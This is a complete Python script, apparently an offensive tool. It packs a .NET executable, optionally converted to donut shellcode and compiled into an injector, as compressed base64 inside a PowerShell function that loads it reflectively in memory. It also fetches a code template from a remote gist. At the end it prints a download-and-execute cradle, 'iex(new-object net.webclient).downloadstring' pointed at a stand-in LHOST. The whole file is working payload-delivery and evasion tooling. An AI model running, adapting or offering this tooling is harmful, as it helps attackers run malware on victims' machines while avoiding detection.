#!/usr/bin/env python3

import os
import sys
import zlib
import base64
import requests
import tempfile
import random, string
from shutil import which
from pathlib import Path
from argparse import ArgumentParser


def gen_random_string(length=10):
    return ''.join(random.sample(string.ascii_letters, int(length)))


parser = ArgumentParser()
parser.add_argument('payload_string', action='store', type=str, help='path to the payload executable (optionally with arguments if ran with --donut) to be wrapped in PowerShell')
parser.add_argument('-d', '--donut', action='store_true', default=False, help='create a donut (https://github.com/S4ntiagoP/donut/tree/syscalls) shellcode from the executable first')
parser.add_argument('-na', '--no-args', action='store_true', default=False, help='pass $args to Main')
args = parser.parse_args()

payload_string = sys.argv[1]
payload_path = Path(payload_string.split()[0])

if args.donut:
    if not which('donut'):
        print('[-] Donut not found!')
        print('[*] Install with: mkdir -p ~/tools && cd ~/tools && git clone --single-branch -b syscalls https://github.com/S4ntiagoP/donut donut && cd donut && make && sudo ln -sv `realpath donut` /usr/local/bin/donut && cd -')
        sys.exit(-1)
    if not which('mono-csc'):
        print('[-] Mono not found!')
        print('[*] Install with: sudo apt install mono-devel')

    payload_args = ' '.join(payload_string.split()[1:])
    donut_shellcode_path = f'/tmp/{gen_random_string(6)}.bin'
    donut_cmd = f"donut -i {payload_path} -b1 -t -p '{payload_args}' -o {donut_shellcode_path}"
    print(f'[*] {donut_cmd}')
    os.system(donut_cmd)

    with open(donut_shellcode_path, 'rb') as f:
        deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
        donut_shellcode_compressed = deflate_stream.compress(f.read())
        donut_shellcode_compressed += deflate_stream.flush()
    donut_shellcode_compressed_b64 = base64.b64encode(donut_shellcode_compressed).decode()
    os.remove(donut_shellcode_path)

    template = requests.get('https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37/raw/f8f12b718bf0cfba2ca1f6f5e29f3518716c1b11/%257Cbin_to_pwsh_template.cs').text
    template = template.replace('DONUT', donut_shellcode_compressed_b64)
    template = template.replace('NAMESPACE', f'{payload_path.stem}Inject')
    with tempfile.NamedTemporaryFile('w') as tmp:
        payload_path = Path(f'/tmp/{payload_path.stem}Inject.exe')
        tmp.write(template)
        mono_csc_cmd = f'mono-csc /t:exe /platform:x64 /out:{payload_path} {tmp.name}'
        print(f'[*] {mono_csc_cmd}')
        os.system(mono_csc_cmd)

if args.no_args or args.donut:
    arguments = '$null'
else:
    arguments = '(, [string[]]$args)'

with open(payload_path, 'rb') as f:
    deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
    payload_compressed = deflate_stream.compress(f.read())
    payload_compressed += deflate_stream.flush()
payload_compressed_b64 = base64.b64encode(payload_compressed).decode()
payload_func_name = f'Invoke-{payload_path.stem}'

if args.donut:
    os.remove(payload_path)

pwsh = f'''\
function {payload_func_name}
{{
    $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("{payload_compressed_b64}"))
    $b = New-Object System.IO.Compression.DeflateStream($a, [System.IO.Compression.CompressionMode]::Decompress)
    $c = New-Object System.IO.MemoryStream;
    $b.CopyTo($c)
    [byte[]]$d = $c.ToArray()
    $e = [System.Reflection.Assembly]::Load($d)
    $f = [System.Console]::Out
    $g = New-Object System.IO.StringWriter
    [System.Console]::SetOut($g)

    $h = [Reflection.BindingFlags]"Public,NonPublic,Static"
    $i = $e.GetType("{payload_path.stem}.Program", $h)
    $j = $i.GetMethod("Main", $h)
    $j.Invoke($null, {arguments})

    [System.Console]::SetOut($f)
    $k = $g.ToString()
    $k
}}
'''

with open(Path.cwd() / f'{payload_func_name}.ps1', 'w') as f:
    f.write(pwsh)

print(f'[+] Contents written to {payload_func_name}.ps1')
print(f'[*] iex(new-object net.webclient).downloadstring("http://LHOST/{payload_func_name}.ps1");{payload_func_name}')
